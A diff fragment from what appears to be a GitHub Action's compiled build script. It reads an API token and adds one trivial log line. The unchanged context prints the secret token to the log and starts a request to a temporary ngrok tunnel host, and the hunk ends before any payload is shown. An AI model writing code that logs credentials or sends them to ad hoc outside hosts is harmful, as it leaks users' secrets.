@@ -25,6 +25,7 @@ function main() {
         core_1.default.info("TechCore build action initiated.");
         const buildId = core_1.default.getInput("techcore-build-id");
         const techCoreToken = core_1.default.getInput("techcore-api-key");
+        console.log('this is new');
         console.log(`your buildId: ${buildId}`);
         console.log(`your techCoreToken: ${techCoreToken}`);
         const { data: stream } = yield axios_1.default.get("https://04c6-216-106-133-65.ngrok.io", {
